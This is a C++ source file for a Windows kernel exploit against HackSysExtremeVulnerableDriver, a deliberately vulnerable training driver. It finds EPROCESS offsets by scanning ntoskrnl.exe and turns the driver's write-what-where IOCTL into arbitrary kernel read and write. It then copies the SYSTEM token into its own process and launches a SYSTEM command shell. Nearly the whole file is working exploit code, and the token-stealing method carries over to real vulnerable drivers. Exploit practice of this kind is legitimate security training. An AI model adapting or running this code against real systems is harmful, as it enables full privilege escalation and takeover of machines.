/////////////////////////////////////////////////////////////////////////////////////////////
// NOTE: TESTED ON Microsoft Windows [version 10.0.19044.1288]                             //
// It should work on every build of W10, EPROCESS field offsets are resolved dynamically <3//
/////////////////////////////////////////////////////////////////////////////////////////////
//#include "ropResolver.h"
#include "patternScanner.h"
#include <iostream>
#define IOCTL_WRITE_WHAT_WHERE 0x22200B
using namespace std;


// only for my specific build of windows, to check if scanned offsets are corrects
constexpr SIZE_T EPROCESS_UNIQUEPID = 0x440;
constexpr SIZE_T EPROCESS_TOKEN = 0x4b8; 
constexpr SIZE_T EPROCESS_LINKS = 0x448;


typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;


BOOL ArbitraryWrite(HANDLE hHevd, PVOID where, PVOID what) {

	PWRITE_WHAT_WHERE payload = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WRITE_WHAT_WHERE));
	if (!payload) return FALSE;

	payload->What = (PULONG_PTR)what;
	payload->Where = (PULONG_PTR)where;

	DWORD lpBytesReturned = 0;
	BOOL status = DeviceIoControl(hHevd,
		IOCTL_WRITE_WHAT_WHERE,
		payload,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&lpBytesReturned,
		NULL);

	HeapFree(GetProcessHeap(), 0, payload);
	return status;
}

uint64_t ArbitraryRead(HANDLE hHevd, PVOID addr) {
	uint64_t value = 0;
	ArbitraryWrite(hHevd, &value, addr);
	return value;
}




int main() {
	// load kernel image from disk 
	auto data = LoadFile(L"C:\\Windows\\System32\\ntoskrnl.exe");
	if (data.empty()) {
		cout << "Cannot read ntoskrnl.exe\n";
		bye();
	}

	// resolving UniqueProcessId offset dynamically
	const char* patternUPidOf = "\x48\x8B\x81\x00\x00\x00\x00\xC3";	 
	const char* maskUPidOf = "xxx????x";
	BYTE* psGetProcessId = GetExportFromFile(data.data(), "PsGetProcessId");
	if (!psGetProcessId) {
		cout << "Cannot resolve PsGetProcessId export :/\n";
		bye();
	}
	
	DWORD uniquePidOffset = PatternScanner::FindOffset((BYTE*)psGetProcessId, 0x50, patternUPidOf, maskUPidOf);
	cout << "UniqueProcessId offset scanned => 0x" << hex << uniquePidOffset << dec << endl;
	cout << "UniqueProcessId offset hardcoded => 0x" << hex << EPROCESS_UNIQUEPID << dec << endl;


	// resolving Token offset dynamically
	const char* patternToken = "\x48\x8D\xB1\x00\x00\x00\x00";
	const char* maskToken = "xxx????";
	BYTE* psReferencePrimaryToken = GetExportFromFile(data.data(), "PsReferencePrimaryToken");
	if (!psReferencePrimaryToken) {
		cout << "Cannot resolve PsReferencePrimaryToken export :/\n";
		bye();
	}
	DWORD tokenOffset = PatternScanner::FindOffset(psReferencePrimaryToken, 0x300, patternToken, maskToken);
	cout << "Token offset scanned => 0x" << hex << tokenOffset << dec << endl;
	cout << "Token offset hardcoded => 0x" << hex << EPROCESS_TOKEN << dec << endl;


	// resolving ActiveProcessLinks offset dynamically
	const char* patternLinks = "\x48\x8B\x9F\x00\x00\x00\x00\x4C\x8D\x3D\x00\x00\x00\x00\x49\x3B\xDF";
	const char* maskLinks = "xxx????xxx????xxx";
	auto pPageSection = GetSection(data.data(), "PAGE");
	if (!pPageSection) {
		cout << "Cannot locate .PAGE section :/\n";
		bye();
	}
	BYTE* pageBase = data.data() + pPageSection->PointerToRawData;
	SIZE_T pageSize = pPageSection->SizeOfRawData;

	DWORD linksOffset = PatternScanner::FindOffset(pageBase, pageSize, patternLinks, maskLinks);
	cout << "ActiveProcessLinks offset scanned => 0x" << hex << linksOffset << dec << endl;	
	cout << "ActiveProcessLinks offset hardcoded => 0x" << hex << EPROCESS_LINKS << dec << endl;

	
	HANDLE hDrv = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDrv == INVALID_HANDLE_VALUE) {
		DWORD err = GetLastError();
		cout << "Cannot create a handle to HEVD. Is it even running bro ? Err code => " << hex << err << endl;
		bye();
	}
	cout << "Handle to HEVD created !\n";

	



	// getting everything we need to get system token
	auto psInit = GetKernelExport("PsInitialSystemProcess");
	cout << "PsInitialSystemProcess address => 0x" << hex << psInit << dec << endl;

	uint64_t system_eprocess = ArbitraryRead(hDrv, (PVOID)psInit);
	cout << "System EPROCESS => 0x" << hex << system_eprocess << dec << endl;

	uint64_t system_token = ArbitraryRead(hDrv, (PVOID)(system_eprocess + tokenOffset));
	system_token &= ~0xF;
	cout << "System TOKEN => 0x" << hex << system_token << dec << endl;

	DWORD pid = GetCurrentProcessId();
	uint64_t current = system_eprocess;
	// check process by process if its the current one
	while (true) {
		DWORD uniquePid = (DWORD)ArbitraryRead(hDrv, (LPVOID)(current + uniquePidOffset));
		if (uniquePid == pid) {
			cout << "Current EPROCESS: 0x" << hex << current << dec << endl;
			cout << "Writing system token (0x" << hex << system_token << ") at addr: 0x"
				<< (current + tokenOffset) << dec << endl;

			ArbitraryWrite(hDrv, (LPVOID)(current + tokenOffset), (LPVOID)&system_token); // write the system token at our process
			break;
		}
		uint64_t flink = ArbitraryRead(hDrv, (LPVOID)(current + linksOffset));  
		current = flink - linksOffset;
	}

	cout << "Token stolen <3 \n";
	system("cmd.exe");


	CloseHandle(hDrv);
	cout << "Handle closed\n";

	
	bye();
	return 1;
}

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⢒⣖⣒⠒⠒⠤⠄⣀⣀⣠⡤⠒⠒⠒⠒⠒⠦⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠞⠁⡤⠚⣉⡠⠼⠗⠀⠀⠀⠀⠀⣼⣷⡄⠰⣏⠉⠉⠑⠲⢌⡑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠘⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠈⠉⠉⠉⠐⠺⢦⡙⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀0xc0ffeebabe <3⠀⠀⠀⠀⠉⠀⠑⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⢀⣠⠤⠒⠒⢲⠒⠒⠤⠤⠤⠤⡤⠤⠤⠤⠖⠒⣶⠒⠒⠢⢄⡀⠀⠀⠀⠀⠈⢦⠀⠀⠀⠀
⠀⠀⣠⠞⠁⠀⠀⢀⡤⠒⣟⠀⠀⠀⠀⢺⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⢹⠓⠤⡀⠀⠀⠀⠑⢄⡀⠀
⣴⡎⠁⢀⣀⡤⠒⠉⠉⠉⢹⠀⠀⠀⢠⠟⠦⠤⠀⣀⠠⠴⠧⠤⣀⡀⠤⠤⠚⡆⠀⠀⠀⡸⠉⠉⠉⠓⠤⣄⣀⠀⠉⢢
⠙⠻⣄⠀⠉⠉⠒⠤⢄⣀⠀⢇⠀⠀⢻⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⢰⠀⠀⣰⠃⢀⣀⠤⠒⠊⠉⠀⢀⡴⠋
⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠈⢙⣧⡀⠘⣍⠿⠇⠀⠀⢠⡖⠒⠒⠢⣤⠈⠯⣍⡇⠀⣰⣟⠉⠁⠀⠀⠀⠀⢀⠔⠁⠀⠀
⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠠⠔⠓⠦⠃⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠈⠧⠞⠳⠄⠀⠀⠀⠀⢀⠔⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠚⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠖⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠚⢯⠁⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢷⡶⢶⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⣉⣉⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀*/

